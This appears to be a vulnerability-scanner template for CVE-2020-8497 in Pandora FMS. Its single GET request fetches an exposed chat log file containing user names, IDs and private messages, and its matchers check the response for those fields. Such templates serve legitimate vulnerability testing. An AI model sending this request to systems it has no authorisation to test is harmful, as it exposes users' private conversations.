id: CVE-2020-8497

info:
  name: Artica Pandora FMS <=7.42 - Arbitrary File Read
  author: gy741
  severity: medium
  description: Artica Pandora FMS through 7.42 is susceptible to arbitrary file read. An attacker can read the chat history, which is in JSON format and contains user names, user IDs, private messages, and timestamps. This can potentially lead to unauthorized data modification and other operations.
  remediation: |
    Upgrade Artica Pandora FMS to version 7.43 or later to mitigate this vulnerability.
  reference:
    - https://k4m1ll0.com/cve-2020-8497.html
    - https://nvd.nist.gov/vuln/detail/CVE-2020-8497
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cve-id: CVE-2020-8497
    cwe-id: CWE-306
    epss-score: 0.002
    epss-percentile: 0.5759
    cpe: cpe:2.3:a:artica:pandora_fms:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: artica
    product: pandora_fms
  tags: cve,cve2020,fms,artica

http:
  - method: GET
    path:
      - '{{BaseURL}}/pandora_console/attachment/pandora_chat.log.json.txt'

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"type"'
          - '"id_user"'
          - '"user_name"'
          - '"text"'
        condition: and

      - type: status
        status:
          - 200
# digest: 4b0a00483046022100a28a70785a3295991951f7a096c5bbd2c250fbc20ca9afcb67003cbb2c55bda6022100a6983846e016dfc68811d28c964c6e6728488712b15f55883fdf80f4fd2f9ec5:922c64590222798bb761d5b6d8e72950